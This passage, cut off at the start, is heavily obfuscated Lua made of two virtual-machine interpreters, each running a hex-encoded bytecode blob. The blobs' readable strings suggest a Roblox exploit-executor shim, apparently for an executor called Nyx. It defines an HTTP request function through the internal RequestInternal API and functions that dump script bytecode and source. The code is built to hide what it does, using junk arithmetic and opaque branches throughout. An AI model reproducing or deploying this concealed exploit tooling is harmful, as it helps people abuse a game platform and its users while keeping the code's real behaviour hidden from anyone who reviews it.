]]=v29(v77[v88[8 -5 ]],nil,v63);end elseif ((4551>2328) and (v89>((1212 -726) -(153 + 280)))) then if  not v86[v88[2 + 0 ]] then v80=v80 + 1 + 0 ;else v80=v88[4 -1 ];end else local v218=0 + 0 + 0 ;local v219;local v220;local v221;while true do if ((3825>=467) and (v218==(1 + 0))) then v221={};v220=v10({},{__index=function(v312,v313) local v314=v221[v313];return v314[164 -(92 + 71) ][v314[1 + 1 ]];end,__newindex=function(v315,v316,v317) local v318=0 -0 ;local v319;while true do if (v318==0) then v319=v221[v316];v319[1 -0 ][v319[767 -(574 + 191) ]]=v317;break;end end end});v218=2 + 0 ;end if ((2758<2980) and (v218==(4 -2))) then for v320=1 + 0 ,v88[(1029 -(834 + 192)) + 1 ] do v80=v80 + (850 -(254 + 595)) ;local v321=v76[v80];if (v321[(67 + 983) -(572 + 477) ]==11) then v221[v320-(1 + 0) ]={v86,v321[1793 -(573 + 1217) ]};else v221[v320-(2 -1) ]={v62,v321[4 -1 ]};end v85[ #v85 + (940 -(714 + 225)) ]=v221;end v86[v88[5 -3 ]]=v29(v219,v220,v63);break;end if ((v218==(0 -0)) or (2890==557)) then v219=v77[v88[1 + 2 ]];v220=nil;v218=1 -0 ;end end end elseif (v89<=(10 + 48)) then if ((v89<=(1389 -(605 + 728))) or (86>=3626)) then if ((v89>(40 + 15)) or (4770==2904)) then local v222=806 -(118 + 688) ;local v223;while true do if ((v222==(48 -(25 + 23))) or (3903==4536)) then v223=v88[1 + 1 ];v86[v223]=v86[v223](v13(v86,v223 + 1 ,v88[10 -7 ]));break;end end elseif ((4093<=4845) and (v86[v88[1888 -(927 + 959) ]]~=v88[13 -9 ])) then v80=v80 + 1 ;else v80=v88[735 -(16 + 716) ];end elseif (v89>57) then v86[v88[2 + 0 ]]={};else local v225=0 -0 ;local v226;local v227;while true do if ((1569<=3647) and (v225==(98 -(11 + 86)))) then for v323=v226 + (2 -1) ,v88[289 -(175 + 110) ] do v227=v227   .. v86[v323] ;end v86[v88[4 -(306 -(300 + 4)) ]]=v227;break;end if (v225==(0 -0)) then v226=v88[1799 -(503 + 1293) ];v227=v86[v226];v225=2 -1 ;end end end elseif ((v89<=(29 + 31)) or (4046>=4927)) then if (v89==(43 + 16)) then local v228=0 -0 ;local v229;local v230;while true do if (v228==(1062 -(810 + 251))) then v86[v229 + 1 + 0 ]=v230;v86[v229]=v230[v88[2 + 2 ]];break;end if (v228==(0 + 0)) then v229=v88[535 -(43 + 490) ];v230=v86[v88[736 -(711 + 6 + 16) ]];v228=3 -2 ;end end elseif ((2395==2395) and (v86[v88[2]]==v88[863 -(240 + 619) ])) then v80=v80 + (2 -1) + 0 ;else v80=v88[4 -1 ];end elseif ((3780>2709) and (v89>((367 -(112 + 250)) + 56))) then local v231=v88[(697 + 1049) -(1344 + (1002 -602)) ];local v232=v88[409 -(255 + 150) ];local v233=v231 + (1455 -(666 + 787)) ;local v234={v86[v231](v86[v231 + 1 + 0 ],v86[v233])};for v259=1 + 0 ,v232 do v86[v233 + v259 ]=v234[v259];end local v235=v234[4 -3 ];if ((4623>=2787) and v235) then local v275=0 -0 ;while true do if (v275==0) then v86[v233]=v235;v80=v88[1742 -(232 + 172 + 1335) ];break;end end else v80=v80 + (407 -(183 + 116 + 107)) ;end else local v236=(0 + 0) -0 ;local v237;while true do if (((2234>=1230) and (v236==(0 + 0))) or (237>=2273)) then v237=v88[1 + 1 ];do return v13(v86,v237,v237 + v88[(169 + 171) -(10 + 327) ] );end break;end end end v80=v80 + 1 + 0 ;end end;end return v29(v28(),{},v17)(...);end return v15("LOL!013O0003073O007265717565737400033O0002347O00122E3O00014O000D3O00013O00013O002B3O00028O00027O0040026O001040026O00F03F026O00144003043O0067616D65030A3O0047657453657276696365030B3O00482O747053657276696365030F3O0052657175657374496E7465726E616C03073O0054696D656F7574025O004CCD402O033O0055726C03043O0067737562030A3O00726F626C6F782E636F6D030B3O00726F70726F78792E636F6D03063O004D6574686F6403053O00752O706572026O00084003053O00537461727403043O007461736B03053O00737061776E026O00184003053O004576656E7403043O005761697403083O005072696F7269747903063O00612O7365727403043O007479706503053O007461626C6503363O00696E76616C696420617267756D656E7420233120746F2027726571756573742720287461626C652065787065637465642C20676F742003023O002920030B3O004361636865506F6C69637903043O00456E756D030F3O00482O74704361636865506F6C69637903043O004E6F6E6503083O00496E7374616E63652O033O006E6577030D3O0042696E6461626C654576656E7403073O0048656164657273030F3O004E59582D46696E6765727072696E742O033O004E595803053O00706169727303053O006C6F77657203073O006865616465727301A73O001215000100014O0016000200083O001215000900013O002623000900350001000200040C3O003500010026230001001B0001000300040C3O001B0001001215000A00013O002623000A00110001000400040C3O001100012O0010000B00054O0010000C00044O0010000D6O000E000B000D00022O00100006000B3O001215000100053O00040C3O001B0001002623000A00080001000100040C3O00080001001201000B00063O00201F000B000B0007001215000D00084O000E000B000D00022O00100004000B3O002028000500040009001215000A00043O00040C3O00080001002623000100340001000400040C3O00340001001215000A00013O002623000A00280001000100040C3O002800010030333O000A000B002028000B3O000C00201F000B000B000D001215000D000E3O001215000E000F4O000E000B000E00020010143O000C000B001215000A00043O002623000A001E0001000400040C3O001E0001002028000B3O0010000625000B003100013O00040C3O00310001002028000B3O001000201F000B000B00112O002D000B000200020010143O0010000B001215000100023O00040C3O0034000100040C3O001E0001001215000900123O0026230009004F0001000400040C3O004F0001002623000100440001000500040C3O004400010020280007000600132O0016000800083O001201000A00143O002028000A000A0015000635000B3O000100042O000B3O00074O000B3O00064O000B3O00084O000B3O00034O001C000A00020001001215000100163O0026230001004E0001001600040C3O004E0001001215000A00013O002623000A00470001000100040C3O00470001002028000B0003001700201F000B000B00182O001C000B000200012O0024000800023O00040C3O00470001001215000900023O002623000900720001001200040C3O00720001002623000100020001000100040C3O00020001001215000A00013O002623000A00590001000400040C3O005900010030333O00190005001215000100043O00040C3O00020001002623000A00540001000100040C3O00540001001201000B001A3O001201000C001B4O0010000D6O002D000C00020002002609000C00620001001C00040C3O006200012O001E000C6O0012000C00013O001215000D001D3O001201000E001B4O0010000F6O002D000E00020002001215000F001E4O002C000D000D000F001215000E00024O0027000B000E0001001201000B00203O002028000B000B0021002028000B000B00220010143O001F000B001215000A00043O00040C3O0054000100040C3O00020001002623000900030001000100040C3O00030001002623000100870001001200040C3O00870001001215000A00013O002623000A00800001000400040C3O00800001001201000B00233O002028000B000B0024001215000C00254O002D000B000200022O00100003000B3O001215000100033O00040C3O00870001002623000A00770001000100040C3O007700010010143O00260002002028000B3O0026003033000B00270028001215000A00043O00040C3O00770001002623000100A30001000200040C3O00A30001001215000A00013O002623000A009A0001000100040C3O009A00012O0016000200023O001201000B00294O0010000C6O0002000B0002000D00040C3O0097000100201F0010000E002A2O002D001000020002002623001000970001002B00040C3O009700012O00100002000F3O00040C3O00990001002O06000B00910001000200040C3O00910001001215000A00043O000E2F0004008A0001000A00040C3O008A0001000636000200A00001000100040C3O00A000012O0003000B6O00100002000B3O001215000100123O00040C3O00A3000100040C3O008A0001001215000900043O00040C3O0003000100040C3O000200012O000D3O00013O00018O00074O001D8O001D000100013O00063500023O000100022O00323O00024O00323O00034O00273O000200012O000D3O00013O00013O00023O00028O0003043O0046697265020A3O001215000200013O002623000200010001000100040C3O000100012O000A00016O001D000300013O00201F0003000300022O001C00030002000100040C3O0009000100040C3O000100012O000D3O00017O00",v9(),...);
local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function() return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...) local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30) if (v1(v30,2)==79) then local v79=0;while true do if (v79==0) then v19=v0(v3(v30,1,1));return "";end end else local v80=v2(v0(v30,16));if v19 then local v91=0;local v92;while true do if (v91==1) then return v92;end if (v91==0) then v92=v5(v80,v19);v19=nil;v91=1;end end else return v80;end end end);local function v20(v31,v32,v33) if v33 then local v81=(v31/(((122 -(32 + 85)) -3)^(v32-(569 -(367 + 197 + 4)))))%((929 -(214 + 713))^(((v33-1) -(v32-(1 + 0))) + (2 -1))) ;return v81-(v81%(878 -(282 + 595))) ;else local v82=1637 -(1523 + 114) ;local v83;while true do if (v82==(0 + 0 + 0)) then v83=(3 -1)^(v32-(2 -1)) ;return (((v31%(v83 + v83))>=v83) and (1271 -((1183 -(892 + 65)) + 1044))) or (619 -(555 + 64)) ;end end end end local function v21() local v34=350 -(87 + 263) ;local v35;while true do if (v34==(2 -1)) then return v35;end if (v34==(0 -0)) then v35=v1(v16,v18,v18);v18=v18 + (1 -0) ;v34=1 -(0 + 0) ;end end end local function v22() local v36,v37=v1(v16,v18,v18 + (7 -5) );v18=v18 + (954 -(802 + 150)) ;return (v37 * (689 -433)) + v36 ;end local function v23() local v38,v39,v40,v41=v1(v16,v18,v18 + (5 -2) );v18=v18 + 3 + 1 ;return (v41 * 16777216) + (v40 * 65536) + (v39 * (1253 -(915 + 82))) + v38 ;end local function v24() local v42=v23();local v43=v23();local v44=1;local v45=(v20(v43,2 -1 ,1506 -(998 + 488) ) * ((2 + (772 -(201 + 571)))^(41 -9))) + v42 ;local v46=v20(v43,(2346 -(116 + 1022)) -(1069 + 118) ,(23 + 47) -39 );local v47=((v20(v43,69 -(154 -117) )==(1 + 0)) and  -1) or ((1 + 0) -0) ;if (v46==(0 + 0)) then if (v45==(791 -(368 + 423))) then return v47 * (0 -(0 + 0)) ;else v46=19 -(10 + 8) ;v44=0 -0 ;end elseif (v46==((8838 -6349) -(416 + 26))) then return ((v45==0) and (v47 * ((3 -2)/(0 + 0)))) or (v47 * NaN) ;end return v8(v47,v46-(1809 -786) ) * (v44 + (v45/((440 -(145 + 293))^(482 -(44 + 386))))) ;end local function v25(v48) local v49=0;local v50;local v51;while true do if (v49==(860 -(814 + (213 -168)))) then v50=v3(v16,v18,(v18 + v48) -(2 -1) );v18=v18 + v48 ;v49=1 + 1 ;end if (v49==(1 + 1)) then v51={};for v93=(349 + 537) -((898 -637) + 624) , #v50 do v51[v93]=v2(v1(v3(v50,v93,v93)));end v49=4 -1 ;end if (v49==(1080 -(1020 + 60))) then v50=nil;if  not v48 then v48=v23();if (v48==((3170 -(760 + 987)) -(630 + (2706 -(1789 + 124))))) then return "";end end v49=1;end if (v49==(9 -6)) then return v6(v51);end end end local v26=v23;local function v27(...) return {...},v12("#",...);end local function v28() local v52=(function() return 1467 -(899 + 568) ;end)();local v53=(function() return;end)();local v54=(function() return;end)();local v55=(function() return;end)();local v56=(function() return;end)();local v57=(function() return;end)();local v58=(function() return;end)();while true do if (v52~= #":") then else local v87=(function() return 0;end)();local v88=(function() return;end)();while true do if (v87==0) then v88=(function() return 0 + 0 ;end)();while true do if ((2 -1)~=v88) then else for v108= #" ",v57 do local v109=(function() return 0;end)();local v110=(function() return;end)();local v111=(function() return;end)();local v112=(function() return;end)();while true do if (v109==(603 -(268 + 335))) then local v149=(function() return 290 -(60 + 230) ;end)();while true do if (v149==(573 -(426 + 146))) then v109=(function() return 1 + 0 ;end)();break;end if (v149==(1456 -(282 + 1174))) then v110=(function() return 0;end)();v111=(function() return nil;end)();v149=(function() return 1;end)();end end end if (v109==1) then v112=(function() return nil;end)();while true do if (v110~=0) then else local v219=(function() return 0;end)();local v220=(function() return;end)();while true do if (v219==(811 -(569 + 242))) then v220=(function() return 0;end)();while true do if (v220==(2 -1)) then v110=(function() return  #"|";end)();break;end if (v220==0) then v111=(function() return v21();end)();v112=(function() return nil;end)();v220=(function() return 1 + 0 ;end)();end end break;end end end if (v110~= #",") then else if (v111== #"\\") then v112=(function() return v21()~=0 ;end)();elseif (v111==(1026 -(706 + 318))) then v112=(function() return v24();end)();elseif (v111== #"-19") then v112=(function() return v25();end)();end v58[v108]=(function() return v112;end)();break;end end break;end end end v56[ #"91("]=(function() return v21();end)();v88=(function() return 2;end)();end if ((1253 -(721 + 530))==v88) then v52=(function() return 2;end)();break;end if (v88~=0) then else v57=(function() return v23();end)();v58=(function() return {};end)();v88=(function() return 1272 -(945 + 326) ;end)();end end break;end end end if (v52==2) then for v95= #"<",v23() do local v96=(function() return 0;end)();local v97=(function() return;end)();local v98=(function() return;end)();while true do if (v96~=(2 -1)) then else while true do if (0~=v97) then else v98=(function() return v21();end)();if (v20(v98, #" ", #"]")==(0 + 0)) then local v113=(function() return 0;end)();local v114=(function() return;end)();local v115=(function() return;end)();local v116=(function() return;end)();local v117=(function() return;end)();while true do if (v113==(702 -(271 + 429))) then while true do if (v114~=2) then else local v241=(function() return 0;end)();local v242=(function() return;end)();while true do if (v241~=(0 + 0)) then else v242=(function() return 0;end)();while true do if (v242~=(1501 -(1408 + 92))) then else v114=(function() return  #"gha";end)();break;end if ((1086 -(461 + 625))==v242) then if (v20(v116, #"}", #"/")== #"[") then v117[1290 -(993 + 295) ]=(function() return v58[v117[2]];end)();end if (v20(v116,1 + 1 ,1173 -(418 + 753) )~= #"<") then else v117[ #"-19"]=(function() return v58[v117[ #"xxx"]];end)();end v242=(function() return 1;end)();end end break;end end end if (v114~= #":") then else local v243=(function() return 0 + 0 ;end)();local v244=(function() return;end)();while true do if (0==v243) then v244=(function() return 0 + 0 ;end)();while true do if (1==v244) then v114=(function() return 1 + 1 ;end)();break;end if (v244~=(0 + 0)) then else v117=(function() return {v22(),v22(),nil,nil};end)();if (v115==(1769 -(1749 + 20))) then local v254=(function() return 0 + 0 ;end)();local v255=(function() return;end)();while true do if (v254~=(1322 -(1249 + 73))) then else v255=(function() return 0;end)();while true do if (v255==0) then v117[ #"91("]=(function() return v22();end)();v117[ #"0836"]=(function() return v22();end)();break;end end break;end end elseif (v115== #"{") then v117[ #"xxx"]=(function() return v23();end)();elseif (v115==(1 + 1)) then v117[ #"nil"]=(function() return v23() -((1147 -(466 + 679))^(38 -22)) ;end)();elseif (v115~= #"-19") then else local v260=(function() return 0;end)();local v261=(function() return;end)();while true do if (v260==0) then v261=(function() return 0 -0 ;end)();while true do if (v261~=0) then else v117[ #"xnx"]=(function() return v23() -((1902 -(106 + 1794))^16) ;end)();v117[ #".dev"]=(function() return v22();end)();break;end end break;end end end v244=(function() return 1;end)();end end break;end end end if (v114~=0) then else local v245=(function() return 0;end)();local v246=(function() return;end)();while true do if (v245==(0 + 0)) then v246=(function() return 0 + 0 ;end)();while true do if (1==v246) then v114=(function() return  #"[";end)();break;end if (0~=v246) then else v115=(function() return v20(v98,2, #"xxx");end)();v116=(function() return v20(v98, #"http",6);end)();v246=(function() return 1;end)();end end break;end end end if (v114~= #"asd") then else if (v20(v116, #"19(", #"asd")== #"~") then v117[ #"0836"]=(function() return v58[v117[ #"http"]];end)();end v53[v95]=(function() return v117;end)();break;end end break;end if ((0 -0)==v113) then local v190=(function() return 0 -0 ;end)();while true do if ((114 -(4 + 110))==v190) then v114=(function() return 584 -(57 + 527) ;end)();v115=(function() return nil;end)();v190=(function() return 1428 -(41 + 1386) ;end)();end if (v190~=1) then else v113=(function() return 104 -(17 + 86) ;end)();break;end end end if ((1 + 0)~=v113) then else local v191=(function() return 0;end)();while true do if (v191==(1 -0)) then v113=(function() return 5 -3 ;end)();break;end if (v191~=(166 -(122 + 44))) then else v116=(function() return nil;end)();v117=(function() return nil;end)();v191=(function() return 1 -0 ;end)();end end end end end break;end end break;end if (v96==0) then local v105=(function() return 0 -0 ;end)();local v106=(function() return;end)();while true do if (v105==(0 + 0)) then v106=(function() return 0;end)();while true do if (v106==(1 + 0)) then v96=(function() return 1;end)();break;end if (v106~=(0 -0)) then else v97=(function() return 0;end)();v98=(function() return nil;end)();v106=(function() return 1;end)();end end break;end end end end end for v99= #"}",v23() do v54[v99-#"|" ]=(function() return v28();end)();end return v56;end if (v52~=(65 -(30 + 35))) then else local v89=(function() return 0;end)();local v90=(function() return;end)();while true do if (v89==0) then v90=(function() return 0;end)();while true do if (0==v90) then v53=(function() return {};end)();v54=(function() return {};end)();v90=(function() return 1 + 0 ;end)();end if (v90~=(1259 -(1043 + 214))) then else v52=(function() return  #"[";end)();break;end if ((3 -2)==v90) then v55=(function() return {};end)();v56=(function() return {v53,v54,nil,v55};end)();v90=(function() return 2;end)();end end break;end end end end end local function v29(v59,v60,v61) local v62=v59[1213 -(323 + 889) ];local v63=v59[5 -(1889 -(927 + 959)) ];local v64=v59[583 -(361 + 219) ];return function(...) local v65=v62;local v66=v63;local v67=v64;local v68=v27;local v69=321 -(53 + 267) ;local v70= -(1 + 0);local v71={};local v72={...};local v73=v12("#",...) -(414 -(15 + 398)) ;local v74={};local v75={};for v84=982 -(18 + 964) ,v73 do if (v84>=v67) then v71[v84-v67 ]=v72[v84 + (3 -2) ];else v75[v84]=v72[v84 + 1 ];end end local v76=(v73-v67) + 1 + 0 ;local v77;local v78;while true do v77=v65[v69];v78=v77[1 + 0 ];if ((2822==2822) and (v78<=20)) then if ((v78<=(859 -(20 + (2797 -1967)))) or (1061==1857)) then if (v78<=(4 + 0)) then if ((2760>1364) and (v78<=1)) then if (v78>(126 -(116 + 10))) then v75[v77[1 + 1 ]]=v77[3];else do return;end end elseif ((v78<=(740 -((1274 -(16 + 716)) + 196))) or (4902<=3595)) then v69=v77[3];elseif ((v78==(6 -3)) or (3852==293)) then do return v75[v77[1 + 1 ]];end else local v155=v66[v77[3]];local v156;local v157={};v156=v10({},{__index=function(v192,v193) local v194=v157[v193];return v194[1 + 0 ][v194[1 + 1 ]];end,__newindex=function(v195,v196,v197) local v198=0;local v199;while true do if ((v198==0) or (1559==4588)) then v199=v157[v196];v199[2 -1 ][v199[2]]=v197;break;end end end});for v200=2 -1 ,v77[1555 -(1126 + 425) ] do v69=v69 + (406 -((227 -109) + 287)) ;local v201=v65[v69];if (v201[3 -2 ]==(1128 -((215 -(11 + 86)) + 1003))) then v157[v200-((4 -2) -1) ]={v75,v201[1 + 2 ]};else v157[v200-(978 -(553 + 424)) ]={v60,v201[3 + 0 ]};end v74[ #v74 + 1 ]=v157;end v75[v77[2 + 0 ]]=v29(v155,v156,v61);end elseif (v78<=(4 + 2)) then if ((v78>(3 + 2)) or (4484==788)) then if ((4568>=3907) and (v75[v77[2 + 0 ]]==v77[8 -4 ])) then v69=v69 + (2 -1) ;else v69=v77[6 -3 ];end else v75[v77[1 + 1 ]]=v60[v77[14 -11 ]];end elseif ((1246<3470) and (v78<=(760 -(239 + 514)))) then v75[v77[(2 -1) + 1 ]]=v75[v77[1332 -(797 + 532) ]];elseif (v78==(39 -31)) then local v160=v77[(1798 -(503 + 1293)) + 0 ];local v161=v75[v77[2 + 1 ]];v75[v160 + (2 -1) ]=v161;v75[v160]=v161[v77[(3368 -2162) -(373 + 829) ]];else v75[v77[733 -(345 + 131 + 255) ]]=v29(v66[v77[3]],nil,v61);end elseif (v78<=14) then if ((4068>=972) and (v78<=(1141 -(369 + 761)))) then if (v78==((1067 -(810 + 251)) + 4)) then if ((493<3893) and (v77[2 -0 ]==v75[v77[7 -3 ]])) then v69=v69 + (239 -(64 + 174)) ;else v69=v77[3];end else v61[v77[1 + 2 ]]=v75[v77[2]];end elseif ((v78<=12) or (1473>=3332)) then v75[v77[2 -(0 + 0) ]]=v61[v77[339 -(45 + 99 + 192) ]];elseif (v78==(229 -(42 + 174))) then v75[v77[2]]=v75[v77[3 + 0 ]][v77[4 + 0 ]];elseif (v75[v77[1 + 1 ]]==v77[(1360 + 148) -(363 + 1141) ]) then v69=v69 + ((2114 -(43 + 490)) -(1183 + 397)) ;else v69=v77[8 -(738 -(711 + 22)) ];end elseif (v78<=(13 + 4)) then if (v78<=(12 + (11 -8))) then v75[v77[1977 -((2772 -(240 + 619)) + 62) ]]=v75[v77[2 + 1 ]];elseif ((v78>(42 -26)) or (4051<=1157)) then v75[v77[1935 -(565 + 1368) ]]=v29(v66[v77[1 + 2 ]],nil,v61);elseif ((604<2881) and  not v75[v77[7 -5 ]]) then v69=v69 + 1 ;else v69=v77[1664 -(1477 + 184) ];end elseif (v78<=(24 -6)) then v61[v77[3 + 0 ]]=v75[v77[2]];elseif (v78>(875 -(564 + 292))) then local v170=v77[(2 -0) -0 ];do return v75[v170](v13(v75,v170 + 1 ,v77[8 -5 ]));end else v75[v77[306 -(244 + 4 + 56) ]]=v75[v77[3]][v77[4 + 0 ]];end elseif ((v78<=(507 -(41 + 435))) or (900==3377)) then if ((4459>591) and (v78<=(1026 -(938 + (1807 -(1344 + 400)))))) then if (v78<=(17 + 5)) then if (v78==21) then if v75[v77[(1532 -(255 + 150)) -(936 + 189) ]] then v69=v69 + 1 + 0 ;else v69=v77[(1273 + 343) -(1565 + 48) ];end else v75[v77[2 + 0 + 0 ]]=v77[1141 -(782 + 356) ];end elseif ((3398>=2395) and (v78<=(290 -(176 + 91)))) then if (v77[4 -2 ]==v75[v77[5 -(4 -3) ]]) then v69=v69 + (1093 -((3149 -2174) + 117)) ;else v69=v77[3];end elseif (v78==(1899 -(157 + 1718))) then do return v75[v77[2 + 0 ]];end else local v175=v77[6 -4 ];do return v75[v175](v13(v75,v175 + (3 -2) ,v77[1021 -(697 + 321) ]));end end elseif (v78<=(76 -48)) then if ((v78<=(54 -(1767 -(404 + 1335)))) or (2183>=2824)) then for v150=v77[2],v77[(412 -(183 + 223)) -3 ] do v75[v150]=nil;end elseif (v78>(32 -5)) then do return;end else local v176=v77[1 + 1 ];v75[v176]=v75[v176](v13(v75,v176 + (1 -0) ,v77[7 -4 ]));end elseif ((1936==1936) and (v78<=(1256 -(322 + 905)))) then local v135=611 -(602 + 9) ;local v136;local v137;local v138;while true do if ((v135==1) or (4832<4313)) then v138=0;for v224=v136,v77[4] do v138=v138 + ((789 + 401) -(449 + 740)) ;v75[v224]=v137[v138];end break;end if (v135==(872 -(826 + 46))) then v136=v77[949 -(245 + 702) ];v137={v75[v136](v75[v136 + 1 + 0 ])};v135=1;end end elseif (v78==((694 + 1234) -(260 + 1638))) then local v178=v66[v77[443 -(382 + 58) ]];local v179;local v180={};v179=v10({},{__index=function(v204,v205) local v206=0;local v207;while true do if ((4088>3874) and (v206==(337 -(10 + 327)))) then v207=v180[v205];return v207[3 -2 ][v207[2 + 0 ]];end end end,__newindex=function(v208,v209,v210) local v211=v180[v209];v211[1 -0 ][v211[5 -3 ]]=v210;end});for v213=1206 -(902 + 303) ,v77[4] do v69=v69 + (1 -0) ;local v214=v65[v69];if (v214[1]==(16 -9)) then v180[v213-(1 + 0) ]={v75,v214[686 -(483 + 200) ]};else v180[v213-1 ]={v60,v214[3]};end v74[ #v74 + ((450 -(108 + 341)) -(0 + 0)) ]=v180;end v75[v77[767 -(468 + (1255 -958)) ]]=v29(v178,v179,v61);else v69=v77[3];end elseif ((4332==4332) and (v78<=(598 -(334 + 228)))) then if (v78<=33) then if ((3999>=2900) and (v78==(107 -(1568 -(711 + 782))))) then v75[v77[2]]=v61[v77[3]];else local v141=v77[4 -2 ];do return v13(v75,v141,v141 + v77[3] );end end elseif ((v78<=(61 -27)) or (2525>4064)) then v75[v77[2]]=v60[v77[1 + 2 ]];elseif ((4371==4371) and (v78==(271 -(141 + 95)))) then local v183=0 + 0 ;local v184;while true do if (v183==(0 -0)) then v184=v77[2];v75[v184]=v75[v184](v13(v75,v184 + (2 -1) ,v77[1 + (3 -1) ]));break;end end elseif ( not v75[v77[5 -3 ]] or (266>4986)) then v69=v69 + 1 + 0 ;else v69=v77[2 + 1 ];end elseif ((1991>=925) and (v78<=(54 -15))) then if (v78<=(22 + 15)) then local v144=v77[2];local v145={v75[v144](v75[v144 + 1 + 0 ])};local v146=0 -0 ;for v152=v144,v77[769 -((1706 -1132) + 191) ] do v146=v146 + 1 + 0 ;v75[v152]=v145[v146];end elseif (v78>(94 -56)) then local v185=0;local v186;while true do if ((455<2053) and (v185==0)) then v186=v77[2 + 0 ];do return v13(v75,v186,v70);end break;end end else local v187=849 -(254 + 595) ;local v188;local v189;while true do if (v187==1) then v75[v188 + (127 -(55 + 71)) ]=v189;v75[v188]=v189[v77[5 -1 ]];break;end if (v187==0) then v188=v77[1792 -(573 + 1217) ];v189=v75[v77[8 -5 ]];v187=1;end end end elseif (v78<=(4 + 36)) then local v147=(0 + 0) -0 ;local v148;while true do if ((v147==(939 -(714 + 225))) or (826==4851)) then v148=v77[2];do return v13(v75,v148,v70);end break;end end elseif (v78==(119 -78)) then if v75[v77[2 -0 ]] then v69=v69 + 1 + 0 ;else v69=v77[3 -0 ];end else for v217=v77[808 -(118 + 688) ],v77[51 -(25 + 23) ] do v75[v217]=nil;end end v69=v69 + 1 + 0 ;end end;end return v29(v28(),{},v17)(...);end return v15("LOL!033O00028O0003113O0067657473637269707462797465636F6465030A3O0064756D70737472696E67000A3O0012013O00013O0026063O0001000100010004023O0001000100020900015O00120B000100023O000209000100013O00120B000100033O0004023O000900010004023O000100016O00013O00023O00053O00028O00026O00F03F2O033O0049734103063O0053637269707403053O007063612O6C01313O001201000100014O001A000200043O00260600010007000100010004023O00070001001201000200014O001A000300033O001201000100023O00260600010002000100020004023O000200012O001A000400043O00260600020013000100020004023O001300010006150003001000013O0004023O001000012O0018000400023O0004023O003000012O001A000500054O0018000500023O0004023O003000010026060002000A000100010004023O000A0001001201000500013O000E0A00010028000100050004023O002800010006153O001F00013O0004023O001F000100200800063O0003001201000800044O002300060008000200062400060021000100010004023O002100012O001A000600064O0018000600023O00120C000600053O00060400073O000100012O00078O00250006000200072O000F000400074O000F000300063O001201000500023O00260600050016000100020004023O00160001001201000200023O0004023O000A00010004023O001600010004023O000A00010004023O003000010004023O000200016O00013O00013O00013O0003063O00536F7572636500044O00227O0020135O00012O00183O00028O00017O00013O0003113O0067657473637269707462797465636F646501053O00120C000100014O000F00026O0014000100024O002800019O0000017O00",v9(),...);
